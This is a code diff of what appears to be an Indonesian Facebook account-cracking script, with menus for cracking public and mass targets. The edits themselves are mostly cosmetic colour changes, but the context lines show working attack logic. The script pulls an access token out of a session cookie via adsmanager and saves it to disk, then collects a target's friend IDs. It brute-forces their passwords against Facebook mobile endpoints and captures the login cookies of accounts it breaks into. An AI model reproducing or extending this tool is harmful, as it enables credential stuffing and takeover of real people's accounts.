@@ -186,8 +186,7 @@ def banner():
 def login():
 	os.system('clear')
 	banner()
-	print('━━'* 25)
-	cok = input(f'{k}Masukkan cookie :{h} ')
+	cok = input(f'[•]{u}Masukkan cookie :{h} ')
 	try:
 		head = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"}
 		link = ses.get("https://web.facebook.com/adsmanager?_rdc=1&_rdr", headers=head, cookies={"cookie": cok})
@@ -198,7 +197,8 @@ def login():
 				xz = ses.get(f"https://web.facebook.com/adsmanager/manage/campaigns?act={x}&nav_source=no_referrer", headers = head, cookies={"cookie": cok})
 				took = re.search('(EAAB\w+)',xz.text).group(1)
 				open('.tok.txt', 'a').write(took);open('.cok.txt', 'a').write(cok)
-				exit(f"Token : {took} \ncookies aktif")
+				print(f"{u}Token : {took} ")
+				menu()
 	except Exception as e:exit(e)
   
 #----------[ BAGIAN-MENU ]----------#            
@@ -223,11 +223,11 @@ def menu():
 	os.system('clear')
 	banner()
 	prints(panel(f"""[white][[cyan]•[white]] Name Tumbal [[green]{nama}[white]] \n[[cyan]•[white]] Idz Tumbal [white][[green]{uidfb}[white]]""",width=43,title=f"[[green] INFO TUMBAL [/]]",style=f"bold blue"))
-	prints(panel(f"""[white][[cyan]01[white]] Crack Publik [[green]  ON[white]] \n[[cyan]02[white]] Crack Massal [white][[green] ON [white]] \n[[cyan]03[white]] Result CP [[red] OF [white]]\n[[cyan]04[white]] Result OK [white][[red] OF [white]]\n[[cyan]{mer}00[white]] logout [white][ [red]hapus cookies [white]] [ [green]ON [white]] """,width=43,title=f"[[green] MENU CRACK [/]]",style=f"bold blue"))
+	prints(panel(f"""[white][[cyan]01[white]] Crack Publik [[green] ON [white]] \n[[cyan]02[white]] Crack Massal [white][[green] ON [white]] \n[[cyan]03[white]] Result CP [[red] OF [white]]\n[[cyan]04[white]] Result OK [white][[red] OF [white]]\n[[cyan]{mer}00[white]] logout [white][[red]hapus cookies[white]] [[green] ON [white]] """,width=43,title=f"[[green] MENU CRACK [/]]",style=f"bold blue"))
 	print(f"{biru}╭────────────────────────────────────────────{puti}")
 	CYXIEON_GANTENG = input(f'{biru}└──[{puti} Input menu : ')
 	if CYXIEON_GANTENG in ['01','1']:
-	        idt = input('\n{biru}└──[{puti} ID Target : ')
+	        idt = input('\n{p}└──[{x} ID Target : ')
 	        dump(idt,"",{"cookie":cok},token)
 	        atur_id()
 	if CYXIEON_GANTENG in ['02','2']:
@@ -326,7 +326,7 @@ def dump(idt,fields,cookie,token):
 		for i in url["friends"]["data"]:
 			#print(i["id"]+"|"+i["name"])
 			id.append(i["id"]+"|"+i["name"])
-			sys.stdout.write(f"\r└──[ sedang mengumpulkan id, sukses mengumpulkan {H}{len(id)}{P} id....{P}"),
+			sys.stdout.write(f"\r{biru}└──[{puti} sedang mengumpulkan id, sukses mengumpulkan {H}{len(id)}{P} id....{P}"),
 			sys.stdout.flush()
 		dump(idt,url["friends"]["paging"]["cursors"]["after"],cookie,token)
 	except:pass
@@ -436,11 +436,11 @@ def atur_id():
 #----------[ MENU-METODE ]----------#
 def atur_method():
 	print("")
-	print(f'\n{biru}└──[{puti} 01. m.prod.facebook.com [{hijo}Validate{puti}] ')
-	print(f'{biru}└──[{puti} 02. m.facebook.com [{mer}Reguler{puti}] ')
-	print(f'{biru}└──[{puti} 03. mbasic.facebook.com [{kun}Asyinc{puti}] ')      
+	print(f'\n{biru}└──[{puti} [cyan]01.{puti} m.prod.facebook.com ({hijo}Validate{puti}) ')
+	print(f'{biru}└──[{puti} [cyan]02.{puti} m.facebook.com ({mer}Reguler{puti}) ')
+	print(f'{biru}└──[{puti} [cyan]03.{puti} mbasic.facebook.com ({kun}Asyinc{puti}) ')      
 	print(f"{biru}╭────────────────────────────────────────────{puti}") 
-	CYXIEON_METHODE = input(f'{hijo}└──[{puti} Input method : ')
+	CYXIEON_METHODE = input(f'{biru}└──[{puti} Input method : ')
 	if CYXIEON_METHODE in ['1','01']:
 	   method.append('validate')  
 	elif CYXIEON_METHODE in ['2','02']:
@@ -449,14 +449,14 @@ def atur_method():
 	   method.append('asyinc')
 	else:
 		method.append('validate')
-	print(f"{hijo}╭────────────────────────────────────────────{puti}")
-	print(f'{hijo}└──[{puti} Tambahkan pw manual (y/t) ')
-	print(f"{hijo}╭────────────────────────────────────────────{puti}") 	
-	passwtamb = input(f'{hijo}└──[{puti} Input : ')
+	print(f"{biru}╭────────────────────────────────────────────{puti}")
+	print(f'{biru}└──[{puti} Tambahkan pw manual (y/t) ')
+	print(f"{biru}╭────────────────────────────────────────────{puti}") 	
+	passwtamb = input(f'{biru}└──[{puti} Input : ')
 	if passwtamb in ['y','Y']:
 		     sandine.append('ya')
-		     print(f"{hijo}╭────────────────────────────────────────────{puti}")
-		     sandiku = input(f'{hijo}└──[{puti} Input Pw : ')
+		     print(f"{biru}╭────────────────────────────────────────────{puti}")
+		     sandiku = input(f'{biru}└──[{puti} Input Pw : ')
 		     sandimu = sandiku.split(',')
 		     for sandixnxx in sandimu:
 		         sandina.append(sandixnxx)		 
@@ -467,9 +467,9 @@ def atur_method():
 #----------[ BAGIAN-WORDLIST ]----------#	
 def passwordlist():
 	global prog,des
-	print(f"{hijo}╭────────────────────────────────────────────{puti}")
-	print(f'{hijo}└──[{puti} WAITING ')
-	print(f"{hijo}─────────────────────────────────────────────{puti}")
+	print(f"{biru}╭────────────────────────────────────────────{puti}")
+	print(f'{biru}└──[{puti} WAITING ')
+	print(f"{biru}─────────────────────────────────────────────{puti}")
 	prog = Progress(TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
 	des = prog.add_task('',total=len(id2))
 	with prog:
@@ -529,10 +529,10 @@ def passwordlist():
 				else:
 				    pemuda_tersakiti.submit(crackvalidate,idf,pwx,'m.facebook.com')
 				    
-	print(f"{hijo}╭────────────────────────────────────────────{puti}")
-	print(f'{hijo}└──[{puti} OK {hijo}: %s'%(ok))
-	print(f'{hijo}└──[{puti} CP {kun}: %s'%(cp))
-	print(f"{hijo}─────────────────────────────────────────────{puti}")
+	print(f"{biru}╭────────────────────────────────────────────{puti}")
+	print(f'{biru}└──[{puti} OK {hijo}: %s'%(ok))
+	print(f'{biru}└──[{puti} CP {kun}: %s'%(cp))
+	print(f"{biru}─────────────────────────────────────────────{puti}")
 	
 #----------[ METODE-VALIDATE ]----------#	
 def crackvalidate(idf,pwx,url):
@@ -763,7 +763,7 @@ def crackasyinc(idf,pwx):
         ok+=1
         coki = po.cookies.get_dict()
         kuki = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";"
-        print(f"{hijo}╭────────────────────────────╮{puti}")
+        print(f"{biru}╭────────────────────────────╮{puti}")
         tree = Tree("")
         tree.add(f"\r{hijo}{idf}{puti}").add(f"{hijo}{pw}{puti}").add(f"{mer}{tahun(idf)}{puti}")
         tree.add(f"{hijo}{kuki}{puti}").add(f"{mer}{ua}{puti}")
